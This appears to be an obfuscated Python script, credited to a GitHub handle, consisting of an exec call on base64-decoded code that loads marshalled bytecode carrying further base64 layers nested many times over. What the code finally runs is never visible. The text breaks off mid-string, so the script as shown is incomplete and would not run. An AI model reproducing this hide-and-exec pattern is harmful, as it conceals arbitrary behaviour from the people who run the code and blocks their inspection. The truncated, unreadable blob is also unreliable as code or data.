#Compile By BL4CK DR460N
#https://github.com/Bl4ckDr460n
import base64
exec(base64.b64decode('''import marshal
exec(marshal.loads('''c\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s!\x00\x00\x00d\x00\x00d\x01\x00l\x00\x00Z\x00\x00e\x00\x00j\x01\x00d\x02\x00\x83\x01\x00d\x01\x00\x04Ud\x01\x00S(\x03\x00\x00\x00i\xff\xff\xff\xffNslm\x00\x00aW1wb3J0IG1hcnNoYWwKZXhlYyhtYXJzaGFsLmxvYWRzKCcnJ2NceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDNceDAwXHgwMFx4MDBAXHgwMFx4MDBceDAwcyFceDAwXHgwMFx4MDBkXHgwMFx4MDBkXHgwMVx4MDBsXHgwMFx4MDBaXHgwMFx4MDBlXHgwMFx4MDBqXHgwMVx4MDBkXHgwMlx4MDBceDgzXHgwMVx4MDBkXHgwMVx4MDBceDA0VWRceDAxXHgwMFMoXHgwM1x4MDBceDAwXHgwMGlceGZmXHhmZlx4ZmZceGZmTnRAUFx4MDBceDAwYVcxd2IzSjBJRzFoY25Ob1lXd0taWGhsWXlodFlYSnphR0ZzTG14dllXUnpLQ2NuSjJOY2VEQXdYSGd3TUZ4NE1EQmNlREF3WEhnd01GeDRNREJjZURBd1hIZ3dNRng0TUROY2VEQXdYSGd3TUZ4NE1EQkFYSGd3TUZ4NE1EQmNlREF3Y3lGY2VEQXdYSGd3TUZ4NE1EQmtYSGd3TUZ4NE1EQmtYSGd3TVZ4NE1EQnNYSGd3TUZ4NE1EQmFYSGd3TUZ4NE1EQmxYSGd3TUZ4NE1EQnFYSGd3TVZ4NE1EQmtYSGd3TWx4NE1EQmNlRGd6WEhnd01WeDRNREJrWEhnd01WeDRNREJjZURBMFZXUmNlREF4WEhnd01GTW9YSGd3TTF4NE1EQmNlREF3WEhnd01HbGNlR1ptWEhobVpseDRabVpjZUdabVRuTmdPbHg0TURCY2VEQXdZVmN4ZDJJelNqQkpSekZvWTI1T2IxbFhkMHRhV0doc1dYbG9kRmxZU25waFIwWnpURzE0ZGxsWFVucExRMk51U2pKT1kyVkVRWGRZU0dkM1RVWjRORTFFUW1ObFJFRjNXRWhuZDAxR2VEUk5SRUpqWlVSQmQxaElaM2ROUm5nMFRVUk9ZMlZFUVhkWVNHZDNUVVo0TkUxRVFrRllTR2QzVFVaNE5FMUVRbU5sUkVGM1kzbEdZMlZFUVhkWVNHZDNUVVo0TkUxRVFtdFlTR2QzVFVaNE5FMUVRbXRZU0dkM1RWWjRORTFFUW5OWVNHZDNUVVo0TkUxRVFtRllTR2QzVFVaNE5FMUVRbXhZU0dkM1RVWjRORTFFUW5GWVNHZDNUVlo0TkUxRVFtdFlTR2QzVFd4NE5FMUVRbU5sUkdkNldFaG5kMDFXZURSTlJFSnJXRWhuZDAxV2VEUk5SRUpqWlVSQk1GWlhVbU5sUkVGNFdFaG5kMDFHVFc5WVNHZDNUVEY0TkUxRVFtTmxSRUYzV0VobmQwMUhiR05sUjFwdFdFaG9iVnBzZURSYWJWcGpaVWRhYlZSdVRtTmxSMWt3UzFaNE5FMUVRbU5sUkVGM1dWWmplR1F5U1hwVGFrSktVbnBHYjFreU5VOWlNV3hZWkRCMFlWZEhhSE5YV0d4dlpFWnNXVk51Y0doU01GcDZWRWN4TkdSc2JGaFZibkJNVVRKT2RWTnFTazlaTWxaRlVWaGtXVk5IWkROVVZWbzBUa1V4UlZGdFRteFNSVVl6VjBWb2JtUXdNVWRsUkZKT1VrVkthbHBWVWtKa01XaEpXak5rVGxKdVp6QlVWVkpMV1RKV1JWRllaRmxUUjJRelZGVmFORTVGTVVWUmEwWlpVMGRrTTFSVldqUk9SVEZGVVcxT2JGSkZSak5aZWtsNFdUSldSVkZZYUZsVFIyUXpWRlZhTkU1Rk1VVlJiWFJaVTBka00xUlZXalJPUlRGRlVXMTBXVk5IWkROVVZsbzBUa1V4UlZGdVRsbFRSMlF6VkZWYU5FNUZNVVZSYlVaWlUwZGtNMVJWV2pST1JURkZVVzEwV1ZOSFpETlVWVm8wVGtVeFJWRnRkRmxUUjJRelZGWmFORTVGTVVWUmJrNVpVMGRrTTFSV1dqUk9SVEZGVVcxR1dWTkhaRE5VVmxvMFRrVXhSVkZ0ZEZsVFIyUXpWRlZhTkU1Rk1VVlJiWFJaVTBka00xUldXalJPUlRGRlVXNU9XVk5IWkROVVYzZzBUa1V4UlZGdFJsbFRSMlF6VkZkNE5FNUZNVVZSYlhSWlUwZGtNMVJWV2pST1JURkZVVzEwV1ZOSFpETlVWbG8wVGtVeFJWRnVUbGxUUjJRelZGUkdORTVGTVVWUmJVWlpVMGRrTTFScldqUk9SVEZGVVcxMFdWTkhaRE5VVlZvMFRrVXhSVkZ0ZEZsVFIyUXpWRlphTkU1Rk1VVlJiazVaVTBka00xUnNXalJPUlRGRlVXMUdXVk5IWkROVWJGbzBUa1V4UlZGdGRGbFRSMlF6VkZWYU5FNUZNVVZSYlhSWlUwZGtNMVJYZURST1JURkZVVzVPV1ZOSFpETlViWGcwVGtVeFJWRnNWbUZTYm1jd1ZGVlNUMWt5VmtWUldHUlpVMGRqTUZScldqUk9SVEZGVVcxT2JGSkZSak5XTW5nMFRrVXhSVnBIVG14U1JVWXpWMnRhTkU1Rk1VVlZiVTVzVWtWR00xWXllRFJPUlRGRllVZE9iRkpGUmpOWGExbzBUa1V4UlZadFRteFNSVVl6VmpKNE5FMUdhRWxhTTJST1VqRkthbHBWVWtKTmJHaEpXak5rVGxKdVFtcFpiWGcwVGtVeFJWRnRkRmxUUjJRelZHcEdORTVGTVVWUmJVWlpVMGRrTTFkWGVEUk9SVEZGVVcxMFdWTkhaRE5VTUZvMFRrVXhSVkZ0UmxsVFIyUXpWMVJHTkU1Rk1VVlJiWFJaVTBaS2FscFZVa0prTVdSelpVaHNXVk5IWkROVVZXUlRXVEpLYzJWRVVrNVNSVXBvVjBWb2JtUXhjRmRsUkZKT1VrVktjbGRGYUc1a01XeHpaVVJTVGxKRlNtaFhSV2h1WkRGd2MyVkVVazVTUlVweVYwVm9ibVF3TlhObFJGSk9Va1ZLYUZkRmFHNWxSVEZIWlVSU1RsSkZTbkpYUldodVpERnJlR1ZFVWs1U1JVcG9WMFZvYm1WRk1WZGxSRkpPVWtWS2NsZEZhRzVrTURsSFpVUlNUbEpGU21oWFJXaHVaVVV4YzJWRVVrNVNSVXB5VjBWb1Mxa3lWa1ZSV0dSWVlraG5NRlJXVWs5Wk1sWkZVVmhrWVZKdWFERlhSV2h1WkRBeFIyTkhUbXhTUlZWM1YwVm9ibVF3TVVoV2JVNXNVa1ZXTmxkRmFHNWtNREZJVlcxT2JGSkZTbk5YUldodVpEQXhSMlZFVWs1V1IxSnpWMFZvYm1WRk1WZGxSRkpPVWtWS2FscFZVa1pOTVhCSFpVUlNUbEl4Y0dwYVZWSkNaREZvU1ZvemFFOU5iRnBxV2xWU1JtVnNhRWxhTTJST1VtNW5NRlJXVW10aE1XaEpXak5vVGxKdVp6QlVWVkpEV1RKV1JWSlVUbUZXYm1jd1ZGWlNSMWt5VmtWUldHUlpVMGRrTkZScVNsTlpNbFpGVWxob1dWTkhaRE5VVlZvMFRrVXhWVnBIZUZsVFIyUTBWRlJHTkU1Rk1VVlJiVTVzVWtWVmVsZHJXalJPUlRGVlUyMU9iRkpGUmpOWFJXaHVaVVUwZVZadFRteFNSVlkwVjBWb2JtUXdNVWRsUkZKT1ZrZFNjbGRGYUc1bFJUQjRaVVJTVGxKRlNtcGFWVkpHVFRGd1YyVkVVazVXUlRWcVdsVlNRbVF4YUVsYU0yaFBUV3hLYWxwVlVrWk5SbWhKV2pOa1RsSnVaekJVVmxKcllrWm9TVm96YUU1V2JtY3dWRlZTUTFreVZrVlNWRTVoVW01bk1GUldVbGRaTWxaRlVWaGtXVk5IWkRSVWFrcFhXVEpXUlZKWWNGbFRSMlF6VkZWYU5FNUZNVlZhUjNSWlUwZGtORlJ0ZURST1JURkZVVzFPYkZKRlZYcFhiRm8wVGtVeFZWSnRUbXhTUlVZelYwVm9ibVZGTkhsVmJVNXNVa1ZWZWxkRmFHNWtNREZIWlVSU1RsWkhVbk5YUldodVpVVXdlR1ZFVWs1U1JVcHFXbFZTUmsweGNFZGxSRkpPVmtkb2FscFZVa0prTVdoSldqTm9UMDFzV21wYVZWSkdaVVpvU1ZvelpFNVNibWN3VkZaU2EyRXhhRWxhTTJoUVZtNW5NRlJWVWtOWk1sWkZVbFJPWVZadVp6QlVWbEpQV1RKV1JWRllaRmxUUjJRMFZHcEtVMWt5VmtWU2JXaFpVMGRrTTFSVldqUk9SVEZWV2tkR1dWTkhaRFJVYkZvMFRrVXhSVkZ0ZUZsVFIyUTBWR3RhTkU1Rk1VVlJiWFJaVTBka05GZFhlRFJPUlRGRlVXMU9iRkpGVlhwWGJGbzBUa1V4U0ZkdFRteFNSVVl6VjBWb2JtVkZOSGxWYlU1c1VrVmFjVmRGYUc1a01ERkhaVVJTVGxaSFVuTlhSV2h1WlVVMVIyVkVVazVTUlVwcVdsVlNSazB4Y0VkbFJGSk9WakZLYWxwVlVrSmtNV2hKV2pOb1QwMXNXbXBhVlZKRFlsWm9TVm96WkU1U2JtY3dWRlpTYTJFeGFFbGFNMmhoVm01bk1GUlZVa05aTWxaRlVsUk9ZVlp1WnpCVVZsSlRXVEpXUlZGWVpGbFRSMlEwVkdwS1Uxa3lWa1ZTYlhSWlUwZGtNMVJWV2pST1JURlZXa2Q0V1ZOSFpETlhiWGcwVGtVeFJWRnRUbXhTUlZWNlYydGFORTVGTVZoWGJVNXNVa1ZHTTFkRmFHNWxSVFI1Vm0xT2JGSkZWWGRYUldodVpEQXhSMlZFVWs1V1IxSnlVMVZhTkU1Rk1VVlJiVTVzVWtWVmVsWXllRFJPUlRGVlYyMU9iRkpGUmpOWGEwNUhXVEpXUlZGWVpGbFRSMk13Vkd0YU5FNUZNVVZSYlU1c1VrVkdNMVl5ZURST1JURlZXa2RPYkZKRlJqTlhhMDVMV1RKV1JWRllaRmxUUjJNd1ZHdGFORTVGTVVWUmJVNXNVa1ZHTTFZeWVEUk9SVEZWWVVkT2JGSkZSak5YYkZvMFRrVXhWV0pIVG14U1JVWXpWMnRPVDFreVZrVlJXR1JvVFZobk1GUlZVa3RaTWxaRlVWaGthbUpYZUdwYVZWSkNaVVp3VjJWRVVrNVdSMUpxV2xWU1FtUXhhRWxhZWxKT1RWaG5NRlJWVWtOWk1sWkZVVmhrV1ZOSFpETlVWbU14V1RKV1JWRllaRmxUUjJRelZGVmtVMWt5VmtWUldHaFpVMGRrTTFSVldrNWlNSEJIWlVSU1RsSkZTbXBhVlZKQ1pERm9TVm96WkU1U01uaHFXbFZrWVdKV2FFbGhSekZoWWtobk1GZHRNV0ZaTWxaSVYyMHhWV0ZYYUdwYVZWSkNaVVpvU1ZvelpFNVNibWN3VkZWU1Exa3lWa1ZSV0dSclVtNW5NRlJWVWtkWk1sWkZVVmhrV1ZOSFpETlVWVm8wVGtVeFJWRllSbHBOV0djd1ZGVlNSMWt5VmtWUldHUlpVMGRrTTFSVldqUk9SVEZGVVcxT2JGSkZSalZYUldodVpEQXhSMlZFVWs1U1JVcHFXbFZTUW1ReGFFbGFNMlJPVFZobk1GUlZVa05aTWxaRlVWaGtXVk5IWkROVVZWWlBXVEpXUlZGWVpGbFRSMlF6VkZWYU5FNUZNVVZSYm5CU1VtNW5NRlJWVWtOWk1sWkZVVmhrV1ZOSFpETlVWV2h1VGxab1NWb3paRTVUU0docVdsVlNRbVF4YUVsYU0yUk9VakZLYWxwVlVrSmxSbWhKV2pOa1RsSnVaekJVVmxKclVsWm9WRTFYVG14U1JVWXpXbXhhTkU1Rk1VVlNiVTVzVWtWR00xcEZXalJPUlRGRlVXMU9iRkpGUmpOWlYzZzBUa1V4UlZKdFRteFNSVVl6V1ZkNE5FNUZNVVZUYlU1c1VrVkdNMXByV2pST1JURkZVbTFPYkZKRlJqTlhSV2h1VGtVd2VHVkVVazVTUlZwcVdsVlNRbVF4YUVsYU0yUk9WMFpLYWxwVlVrSmtNV2hKV2pOa1RsSXpRbXBhVlZKQ1pXeG9TVm96WkU1U2JtY3dWREJTVDFreVZrVlJXR1JaVTBka00xUlZXalJPUlRGRlVtcENXVk5IWkROVWExbzBUa1V4UlZGdVJsbFRSMlF6Vkd4YU5FNUZNVVZSYlhSWlUwZGtNMVJYZURST1JURkZVVzFPYkZKSFpEWlhSV2h1WkRBeFYyVkVVazVTUlVwcVdsVlNRbVZIVGxkbFJGSk9VakJ3YWxwVlVrSmtNVmw1VlcxT2JGSkZSak5YUldodVpEQXhSMVJYT1ZsVFIyUXpWRlJHTkU1Rk1VVlJiVTVzVWtWR00xZEZhRzVrTURGR1RsaHdXVk5IWkROVVZsbzBUa1V4UlZGdFRteFNSVVl6VjBWb2JtUXdNVWRsU0Zab1ZtNW5NRlJWVWtkWk1sWkZVVmhrV1ZOSFpETlVWVm8wVGtVeFJWRlhPVmxUUjJRelZHMTRORTVGTVVWUmJVNXNVa1ZHTTFkRmFHNWtNREZKVlcxT2JGSkZSalpYUldodVpEQXhSMlZFVWs1U1JVcHFXbFZTUW1ReVRYcGlTSEJyVW01bk1GUlZVbUZaTWxaRlVWaGtXVk5IWkROVVZWbzBUa1V4UlZGdWNHdFNNVW95V2tab1UwMUdhRWxhTTJSUFZtNW5NRlJWVWtOWk1sWkZVVmhrV1ZOSFpETlVWV2hyWlZkR1dWVnRlR3RTYm1jd1ZGVlNWMWt5VmtWUldHUlpVMGRrTTFSVldqUk9SVEZGVVcweGFWTkdXalpaVldoVFdUSldSVkZVUWxsVFIyUXpWRlZhTkU1Rk1VVlJiVTVzVWtWR00xcEZaSE5rUm5CWlZXMU9iRkpGUlhoWFJXaHVaREF4UjJWRVVrNVNSVXBxV2xWU1FtUXlUWGxsUjNoaFYwVkdkbGRGYUc1a01ERnpaVVJTVGxKRlNtcGFWVkpDWkRGb1NWb3paRTVUUmtwcVdsVlNRbVZHYUVsYU0yUk9VbTVuTUZSVlVrTlpNbFpGVVZoa2ExTkdTbXBhVlZKQ1pVWm9TVm96WkU1U2JtY3dWRlZTUTFreVZrVlJXR1JhWVZkb2FscFZVa0prTVdoSldqTmtUbEp1WnpCVVZWSkRXVEpXUlZGWVpFeFNibWN3VkZWU1Exa3lWa1ZSV0dSWlUwZGtNMVJWV2pST1JURkZVVzV3V1ZOSFpETlVWRVkwVGtVeFJWRnRUbXhTUlVZelYwVm9ibVF3TVVWbFNHeFJZbXhLYWxwVlVrSmxiR2hKV2pOa1RsSnVaekJVVlZKRFdUSldSVkZZWkdwaWJGb3hWMFZvYm1Rd01IaGxSRkpPVWtWS2FscFZVa0prTVdoSldqTmtUbE5GTldwYVZWSkNUa1pvU1ZvelpFNVNibWN3VkZWU1Exa3lWa1ZSV0dSWlUwZGtNMVJWV2pST1JURkZVbTFPYkZKRlZqUlhSV2h1WkRBeFYyVkVVazVXUlVwcVdsVlNRbVZHYUVoT1YwNXNVa1ZHTkZsNlJqUk9SVEZGV2tkT2JGSkZSak5YUldodVpEQXhSMlZFVWs1U1JVcHFXbFZTUjJGV1pEWmhla3BRWld0YU1GbDZSalJPUlRGRldrZE9iRkpGUmpOWFJXaHVaREF4UjJWRVVrNVNSVXBxV2xWU1IyRldaRFpVVkVKUVpXdGFNRmw2UmpST1JURkZXa2RPYkZKRlJqTlhSV2h1WkRBeFIyVkVVazVTUlVwcVdsVlNSMkZXWkRaVVdIQlFaV3RhTUZsNlJqUk9SVEZGV2tkT2JGSkZSak5YUldodVpEQXhSMlZFVWs1U1JVcHFXbFZTUjJGV1pEWlVXR3hRWld0YU1GbDZSalJPUlRGRlYyMU9iRkpGUmpOWFJXaHVaREF4UjJWRVVrNVNSVXBxV2xWU1IyRldaRFpSVkdST1ZucEdObGRGYUc1a01EUjRaVVJTVGxKRlNtcGFWVkpDWkRGb1NWb3paRTVTYm1jd1ZGWmtTMWxyTVRaU1ZHUk9WbnBHTmxkRmFHNWtNRFI0WlVSU1RsSkZTbXBhVlZKQ1pERm9TVm96WkU1U2JtY3dWRlprUzFsck1UWlhWR1JPVm5wR05sZEZhRzVrTURWWFpVUlNUbEpGU21wYVZWSkNaREZvU1ZvelpFNVNibWN3VkZaa1MxbHJNVFpWYmxKcVRWaG5NRlJWVWxkWk1sWkZVVmhrV1ZOSFpETlVWVm8wVGtVeFJWRnRUbXhTUlZwd1ZqTndUbVZYU2xsVWJVNXNVa1ZGZUZkRmFHNWtNREZIWlVSU1RsSkZTbXBhVlZKQ1pERm9TVm96YUZwaVNFNDJWRlpqZUdWc1VrZGxSRkpPVWtWS2FscFZVa0prTVdoSldqTmtUbEp1YURGVFZVNUNXakJzUkZGWFpFcFJNRVp1VTFWT1Fsb3diRVJSVjJSS1VUQkdibE5WVGtKa2EyeEhWMjFPV1ZKdWFERlRWVTVDV2pCc1JGRlhaRXBSTUVadVUxVk9RbG93YkVSUlYyUktVVEJHYmxSSWJFTmFNR3hFVVZoYVdWSjZVbTVUVlU1Q1dqQnNSRkZYWkVwUk1FWnVVMVZPUWxvd2JFUlJWMlJLVWtoak5GTlZUa0phTWxwRVVWZGthbVZVVm1wYVZWSkNaREZvU1ZvelpFNVNibWN3VkZWU1Fsb3diRVJSYlZwWlRWUnNiVmRJYkVKYU1HeEVVVmRrU2xFd1JtNVRWVTVDV2pCc1JGRlhaRXBSTUVadVUxVk9RbG93YkVSUldGWlpUVlJvYmxOVlRrTmFiR2Q0VDFkYVdVMVViRzFYUkVVMVdtMU5lR1ZFVWs1V01GcHFXbFZTUW1ReGFFbGFNMlJPVW01bk1GUlZVa05aTWtwd1VWZGtTbEV3Um01VFZVNUNXakJzUkZGWFpFcFJNRVp1VTFWT1Fsb3dlRFZSVjJSS1VUQkpORk5WVGtObGJFVjRaVVJTVGxKRlNtcGFWVkpDWkRGb1NWb3paRTVSTUVadVZFaHNRbG93YkVSUlYyUlpVbTVrYmxkRVJUVmFiR2Q0VDBka1dVMVViRzFYUkVVMVdteG9OVkZYWkZsTlZHeHRWMFJGTlU5RmJFUlJhbWhaVFZSc2FsZEZXVFZhYkdkNFQxZGFXV1ZWUm01VFZWbzBXVEZuZUU5WFdsbE5WR3h0VjBSRk5WcHNaM2hQVjFwWlRWUnNiVmRFUlRWYWJHZDRUMWh3V1ZOSFpEUlhWbG8wVGtVeFJWRnRUbXhTUlVZelYwVm9ibVF3TVVkbFNGWktVVEJHYmxOVlRrSmFNR3hFVVZka1NsRXdSbTVUVlU1Q1dqQjROVkZYWkVwUk1FWnVVMVZvTTFvd2JFbFVhMDVaVTBka00xUlZXalJPUlRGRlVXMU9iRkpGUmpOVFZVMDBXakJzUjJWSFRrcFJlbWh1VTFWYU5Ga3haM2hQUjJSS1VtNW9hbGRJYkVKYU1XZDRUMGRrV1ZKdVpESlRWVTVEV214bmVFOUlXa3BSTUVrMFUxVk9RMWt4YUVsa01tUktVVEJHYmxwclRrSmFNV2cxVDFkT1dWSnFiRzFUVlU1RFdURm9SRkZYWkUxbFZVWnVWMFJGTlZwcmVEVlBSMlJaVFZSb2JsZEZXalJsYkdoSldqTm9XbFp1WnpCVVZWSkRXVEpXUlZGWVpGbFRSMlF6VkZWYU5HUlZiRVJSVjJSS1VUQkdibE5WVGtKYU1HeEVVVmRrU2xGNmFHNVRWVTVDV2pCc1JGRlhaRXBUU0dSdVUxVm9UMUpXYUVsYU0yUk9VbTVuTUZSVlVrTlpNbFpGVVZoa1RXVlZSbTVUVlU1RFYydHNSRkZYWkVwU2JtaHFWRWhzUTFwc2FEVlJiVTVaVTBoa2JsTlZhRE5hTVdoSFpETmFXVkp1YUcxWFJFVTBXakZvUjJWRWFFcFJNRVp1VmpGT1Fsb3hhRWRrTW1SS1VUQkdibHByVGtKYU1HeEhaVWRPU2xGNmFHNVhSRVUwV2pGb1IyVkhXbGxTYm1odFYwUkZORm94YUVka01tUktVbXBzYlZkSWF6UmFNazE0WlVSU1RsWXdXbXBhVlZKQ1pERm9TVm96WkU1U2JtY3dWRlZTUTFreVNuQlJWMlJLVVRCR2JsTlZUa0phTUd4RVVWZGtUV1ZWUm01VFZVNURXVEZvUkZGWFpGbFNibVJ1VkVoc1Fsb3diRWxVYTJSWlUwZGtNMVJWV2pST1JURkZVVzFPYkZKRlJqTlhSVm8wV214bmVFOVhXbTFTYW14dFUxVk9RbUl4WjNoUFYxcFpaVlZHYmxSRVJUVmFiVnBFVVZka1RVMVViRzFYUkVVMFdqQnNSVTVYV2xsTlZHczBVMVZPUW1Sc1ozaFBWMXBaVFZSc2JWTlZUa0prYTNSSFQxZGFXVTFVYUc1VFZVMDFXbXhuZUU5WFdrcFJNRVZ5VjBWYU5GcHNaM2hQUjJSS1VrUlNibGw2UmpST1JURllVbTFPYkZKRlJqTlhSV2h1WkRBeFIyVkVVazVTUlVwcVdXMXNRbG93YkVSUlYyUktVVEJHYmxOVlRrSmlNR3hFVVZka1NsRXdSbTVUTVU1RFQwVnNTV1F5WkVwUk1FbzJWV3RhTkU1Rk1VVlJiVTVzVWtWR00xZEZhRzVrTURGRVVWZGtTbEV3Um01VFZVNURXVEZvUkU5SFpFcFJNRVp1VTFWYU5Ga3dlRFZSVjJSS1VUQkdibE5WVGtKYU1HeEVVVmRrV1ZKdVpESlRWVTVDV2pCc1JGRnRUbGxSZW1odVUxVk9RbG93YkVSUlYyUlpVbTVrTWxOVlRrSmFNR3hFVVZka1dWSnVaREpUVlU1Q1dqQnNSRkZ0VGxsUmVtaHVVMVZPUWxvd2JFZGxSMDVOWlZWS05sUkVSalJPUlRGRlVXMU9iRkpGUmpOWFJXaHVaREF4UjJWSVZrcFJNRXB0VjBSRk5WcHNaM2hQVjFwWlRUTmtibE5WVGtOYWEzZDRUMGRrU2xOSVpHNWFhMW8wWkZaQ1IwOVhXbGxOVkd4dFYwUkZOVnBzWjNoUFYwNVpVbXBzYlZkRVJUVmFiR2cxWWtkT1dWSnFiRzFUTVdoT1RVWm9TVm96WkU1U2JtY3dWRlZTUTFreVZrVlJXR1JaVW5wUk5GWXpiM2RQVmtKVlRVUnNVVlpFUVRWVlJsRjNUMVpDVlUxRWJGRldSRUUxVlVaUmQwOVdRbFZOUkd4UlZrUkJOVlZHVVhkUFZrSlZUVVJzVVZaRVFUVlZSbEYzVDFaQ1ZVMUViRkZXUkVFMVYwWlJNVmt5U25GbFIwcHFaVmhvYWxwVlVrSmtNV2hKV2pOa1RsSnVaekJVVlZKQ1dqRkdXVlpxUW1oU2VtdzFVMVZTZGxveFJuSmtla0pTVFVoT2JsVnJXa3BOUlRWeFVXczVTbEV3Um01VFZVNUNXakJzUkZGWFpFcFJNRVp1VTFWT1Fsb3diRVJSVjJSS1VUQkdibE5WYUU5Wk1sWkZVVlJHV1ZOSFpETlVWVm8wVGtVeFJWRnRUbXhTUlVZelYwWlJNVmt5U25GbFIwcHFaVmhvYWxwVlVrSmtNV2hKV2pOa1RsSnVaekJVVlZKQ1dqRlNkRkp1VW1GVk1FWnVVMVZTZGxveFVsaFNibXhxVFcxb1JGZFdhRTlpUld4RVVWZGtTbEV3Um01VFZVNUNXakJzUkZGWFpFcFJNRVp1VTFWT1Fsb3diRVJSVjJSS1VUQkdibE5WYUU1ak1XaEpXak5rVGxKdVp6QlVWVkpEV1RKV1JWRllaRXBTYkVwelYxWmpkMW93YkVSUlZGcEtVbTFTTWxsclpETmFNVVY2WWtkc1lWZEZiRzVXYTJSWFlVZEtWRkZYWkVwUk1FWnVVMVZPUWxvd2JFUlJWMlJLVVRCR2JsTlZUa0phTUd4RVVXNXdUazFZWnpCVVZWSkRXVEpXUlZGWVpGbFRSMlF6VkZWWmQwc3hhRWhPUkdoWVpXcEJOVlZHVVhkUFZrSlZUVVJzVVZaRVFUVlZSbEYzVDFaQ1ZVMUViRkZXUkVFMVZVWlJkMDlXUWxWTlJHeFJWa1JCTlZWR1VYZFBWa0pWVFVSc1VWWkVRVFZWUmxGM1QxWkNWVTFFYkZsV1JGWnhWMFZvYm1Rd01VZGxSRkpPVWtWS2FscFZVa0prTVdoSldqTmtUbEp1WnpCVVZWSmhXVEpXUlZGWVpGbFRSMlF6VkZWYU5FNUZNVVZSYlU1c1VrVkZlRmRGYUc1a01ERkhaVVJTVGxKRlNtcGFWVkpDWkRGRmVHVkVVazVTUlVwcVdsVlNRbVF4YUVsYU0yUk9VMFV3ZWxkRmFHNWtNREZYWlVSU1RsSkZTbXBhVlZKQ1pESlNSMlZFVWs1U1JVcHFXbFZTUW1ReVJuTmxSRkpPVWtWYWFscFZVa0prTVhCSFpVUlNUbEpGV21wYVZWSkNaREZvU1ZwNlVrNU5XR2N3VkZWU1Ixa3lWa1ZSV0dSWlUwZGtNMVJXYUZOWk1sWkZVVmhzV1ZOSFpETlVWVlpyVTFkU1IyVkVVazVTUlRWcVdsVlNRbVF4U1hkaFJXeHJVbTVuTUZSVlVsTlpNbFpGVVZoa2ExSnVaekJVVlZKWFdUSldSVkZZWkdGU2JtY3dWRlZTUzFreVZrVlJXR1JaVTBka05GUnFUbE5aTWxaRlVWUktXVk5IWkROVVZWbzBUa1V4VlZwSFRteFNSMlEyVjBWb2JtUXdNVmRsUkZKT1VrVkpOVmRGYUc1a01ERkhaVVJTVGxKRlNURlhSV2h2WWtVeFIyVkVVazVTUlVsM1YwVm9ibVF3TkhobFJGSk9Va1ZKTkZkRmFHNWtNREZIWlVSU1RsSkZTbkpYUldodVpEQXdlR1ZFVWs1U1JVcHFXbFZTYm1Wc2FFbGFNMlJPWWtobk1GUlZVa05qVm1oSldqTmtVRkp1WnpCVVZWSkRXVEpXUlZvemNGbFRSMlF6VkZWYU5FNUZNVVZSYW14WlUwZGtNMVJXV2pST1JURkZVV3BvV1ZOSFpETlVWbG8wVGtVeFJWRnVSbGxUUmtwcVdsVlNRbVF4Y0VkbFJGSk9Va1pLYWxwVlVrSmtNWEJIWlVSU1RsSkdXbXBhVlZKQ1pERm9TVnA2VWs1TldHY3dWRlZTUzFreVZrVlJXR1J0Vm01bk1GUlZVa3RaTWxaRlVWaGtiVkp1WnpCVVZWSkxXVEpXUlZGWVpHaGlTR2QzVjBWb2JtUXdNVWhWYlU1c1VrVkZlVmRGYUc1a01ERklWVzFPYkZKRlJYcFhSV2h1WkRBeFIyVkVVbEJTUlRWcVdsVlNRbVZXYUVsYU0yUk9VMFJHYWxwVlVrSmxWbWhKV2pOa1RsTklhR3BhVlZKQ1pWWm9TVm96WkU1VFJYQnFXbFZTYjJGV2FFbGFNMlJPVTBob2FscFZVa0psVm1oSldqTmtUbEl4U21wYVZWSkNUa1pvU1ZvelpFNVNibWN3VkZaU2MyRXhhRWxhTTJSUFZtNW5NRlJWVWtOamJHaEpXak5rVGsxWVp6QlVWVkpEWlZab1NWcDZVbHBpU0djd1ZGVlNRMDlHYUVsYU0yUk9Za2huTUZSVlVrTmhNV2hKV2pOa1QxWnVaekJVVlZKRFdUSldSVkpVVG0xV2JtY3dWRlZTUzFreVZrVlJXR1JwWWtobk1GUlZVa05aTWxaRlVWaGthMUp1YURGWFJXaHVaREF4U0dOSFRteFNSVXB3VjBWb2JtUXdNVWxsUjA1c1VrVkdOVmRGYUc1a01ERklWVzFPYTFKdVp6QlVWVkpEWVRGb1NFNVhUbXhTUlVZelYwVm9iazVGTUhobFJGSk9Va1UxYWxwVlVrSmtNbHBYWlVSU1RsSkZOV3BhVlZKQ1pESlNSMlZFVWs1U01EVnFXbFZTUW1ReVJuTmxTR3haVTBka00xUlZhRFJaTWxaRlVWaHdXVk5IWkROVVZWbzBUa1U1UlZSdFRteFNSVVkwVjBWb2JtUXdNVWxOVjA1c1VrVkZkMWRGYUc1a01ERkpWVzFPYkZKRlJYcFhSV2h1WkRBeFNGVnRUbXhTUlVwd1YwVm9ibVF3TVVoVmJVNXNVa1ZLY1ZkRmFHNWtNREZIWlVSU1VGSkZOV3BhVlZKQ1pWWm9TVm96WkU1VFJFWnFXbFZTUWsxV2FFbGFNMlJPVTBob2FscFZVa0pOVm1oSldqTmtUbEl6UW1wYVZWSkRZa1pvU1ZvelpFNVNNVXBxV1RKNE5FNUZNVVZSYWtKWlUwZGtNMWR0ZURST1JURkZVV3BvV1ZOSFpETlVhMW8wVGtVeFJWRnRUbXhTUjJRMlYwVm9ibVF3TVZkbFJGSk9Va1ZLYWxwVlVrWk5NWEJIWlVSU1RsSXhXbXBhVlZKQ1pERm9TVm96YUU5TldHY3dWREJTVDFreVZrVlJXR2haVTBka00xUlZXalJPUlRGRlVtcG9XVk5IWkROVWJGbzBUa1V4UlZGdVJsbFRSMlEwVkZWYU5FNUZNVVZSYlU1c1VrZGtObGRGYUc1a01ERkhaVVJTVGxKRlNtcGFWVkpDWlVkV1YyVkVVazVTTUhCcVdsVlNRbVF5VWtkbFJGSk9Wa1ZhYWxwVlVrSmtNV2hKV25wU1RrMVlaekJVVlZKRFdUSldSVkZZWkZsVFIyUXpWRlphYTJSV2FFbGFNMmhhVm01bk1GUlZVa05aTWxaRlVWUkNhMUp1WnpCVVZsSkxXVEpXUlZGWVpHaE5XR2d4VjBWb2JtUXdNVWxUYlU1cFlraG5NRlJWVWtkWk1sWkZVVmhvV1ZOSFpETlVWbG8wVGtVeFJWSnFRbGxUUjJRMFZGUkdORTVGTVVWUmJYUlpVMGRrTTFkdGVEUk9SVEZGVVcxT2JGSkZWWHBWYWtKdlpGWm9TVm96WkU1V2JtY3dWRlZTUTFkV1dYbE9SM1JaVTBka00xUlZXalJPUlRGRlZXcENXVk5IWkRSVWExbzBUa1V4UlZGdVNsbFNlbFpxV2xWU1FtUXlUbkZUYlU1c1VrVkdORmRGYUc1a01ERlhaVV